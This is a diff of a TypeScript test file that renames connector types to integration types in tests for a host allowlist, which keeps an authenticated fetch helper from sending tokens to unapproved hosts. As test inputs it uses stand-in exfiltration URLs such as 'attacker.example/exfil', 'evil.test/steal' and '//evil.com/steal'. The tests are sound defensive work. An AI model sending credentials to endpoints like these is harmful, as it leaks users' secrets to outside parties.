@@ -3,11 +3,11 @@ import {
 	type CapabilityArgs,
 	type CodemodeNamespace,
 	type ExecuteRequestInput,
-	ConnectorHostNotAllowedError,
+	IntegrationHostNotAllowedError,
 	createAuthenticatedFetch,
 	createExecuteHelperPrelude,
 } from './codemode-utils.ts'
-import { assertConnectorHostAllowed } from './connector-host-allowlist.ts'
+import { assertIntegrationHostAllowed } from './integration-host-allowlist.ts'
 
 type SecretSetCall = {
 	name: string
@@ -25,7 +25,7 @@ type SandboxHelpers = {
 
 const fakeAccessToken = 'test-access-token-abc123'
 
-const spotifyConnector = {
+const spotifyIntegration = {
 	name: 'spotify',
 	tokenUrl: 'https://accounts.spotify.test/api/token',
 	apiBaseUrl: 'https://api.spotify.com/v1',
@@ -40,10 +40,10 @@ const spotifyConnector = {
 function createCodemode() {
 	const secretSetCalls: Array<SecretSetCall> = []
 	const codemode = {
-		async connector_get(args: CapabilityArgs) {
+		async integration_get(args: CapabilityArgs) {
 			const name = args.name
 			expect(name).toBe('spotify')
-			return { connector: spotifyConnector }
+			return { integration: spotifyIntegration }
 		},
 		async value_get(args: CapabilityArgs) {
 			const name = args.name
@@ -73,7 +73,7 @@ function createCodemode() {
 	) => {
 		const request = new Request(input, init)
 		fetchCalls.push(request)
-		if (request.url === spotifyConnector.tokenUrl) {
+		if (request.url === spotifyIntegration.tokenUrl) {
 			return new Response(JSON.stringify({ access_token: fakeAccessToken }), {
 				status: 200,
 				headers: { 'content-type': 'application/json' },
@@ -101,7 +101,7 @@ async function withPatchedFetch<T>(
 	}
 }
 
-test('rejects with ConnectorHostNotAllowedError for disallowed host and does not call fetch', async () => {
+test('rejects with IntegrationHostNotAllowedError for disallowed host and does not call fetch', async () => {
 	const { codemode, fetchCalls, fetchStub } = createCodemode()
 
 	const authenticatedFetch = await withPatchedFetch(fetchStub, () =>
@@ -115,7 +115,7 @@ test('rejects with ConnectorHostNotAllowedError for disallowed host and does not
 		withPatchedFetch(fetchStub, () =>
 			authenticatedFetch('https://attacker.example/exfil'),
 		),
-	).rejects.toThrow(ConnectorHostNotAllowedError)
+	).rejects.toThrow(IntegrationHostNotAllowedError)
 
 	// No additional fetch call was made (the exfil request never went out)
 	expect(fetchCalls.length).toBe(fetchCallsBeforeExfil)
@@ -175,7 +175,7 @@ test('error message does not contain the literal token value', async () => {
 		caughtError = error as Error
 	}
 
-	expect(caughtError).toBeInstanceOf(ConnectorHostNotAllowedError)
+	expect(caughtError).toBeInstanceOf(IntegrationHostNotAllowedError)
 	expect(caughtError!.message).not.toContain(fakeAccessToken)
 	expect(JSON.stringify(caughtError)).not.toContain(fakeAccessToken)
 })
@@ -199,7 +199,7 @@ test('prelude sandbox version rejects disallowed hosts', async () => {
 		withPatchedFetch(fetchStub, () =>
 			authenticatedFetch('https://evil.test/steal'),
 		),
-	).rejects.toThrow(/ConnectorHostNotAllowedError|does not allow requests/)
+	).rejects.toThrow(/IntegrationHostNotAllowedError|does not allow requests/)
 
 	expect(fetchCalls.length).toBe(fetchCallsBeforeExfil)
 })
@@ -228,29 +228,33 @@ test('prelude sandbox version allows requests to valid hosts', async () => {
 	)
 })
 
-test('assertConnectorHostAllowed rejects protocol-relative URLs', () => {
+test('assertIntegrationHostAllowed rejects protocol-relative URLs', () => {
 	expect(() =>
-		assertConnectorHostAllowed('spotify', spotifyConnector, '//evil.com/steal'),
-	).toThrow(ConnectorHostNotAllowedError)
+		assertIntegrationHostAllowed(
+			'spotify',
+			spotifyIntegration,
+			'//evil.com/steal',
+		),
+	).toThrow(IntegrationHostNotAllowedError)
 })
 
-test('assertConnectorHostAllowed allows single-slash relative paths', () => {
+test('assertIntegrationHostAllowed allows single-slash relative paths', () => {
 	expect(() =>
-		assertConnectorHostAllowed('spotify', spotifyConnector, '/v1/me'),
+		assertIntegrationHostAllowed('spotify', spotifyIntegration, '/v1/me'),
 	).not.toThrow()
 })
 
-test('fails closed when connector has no allowlist configured', async () => {
-	const emptyConnector = {
-		...spotifyConnector,
+test('fails closed when integration has no allowlist configured', async () => {
+	const emptyIntegration = {
+		...spotifyIntegration,
 		requiredHosts: [] as Array<string>,
 		apiBaseUrl: null,
 	}
 	const secretSetCalls: Array<{ name: string; value: string; scope: string }> =
 		[]
 	const codemode = {
-		async connector_get() {
-			return { connector: emptyConnector }
+		async integration_get() {
+			return { integration: emptyIntegration }
 		},
 		async value_get() {
 			return { value: 'spotify-client-id' }
@@ -278,7 +282,7 @@ test('fails closed when connector has no allowlist configured', async () => {
 	) => {
 		const request = new Request(input, init)
 		fetchCalls.push(request)
-		if (request.url === emptyConnector.tokenUrl) {
+		if (request.url === emptyIntegration.tokenUrl) {
 			return new Response(JSON.stringify({ access_token: fakeAccessToken }), {
 				status: 200,
 				headers: { 'content-type': 'application/json' },
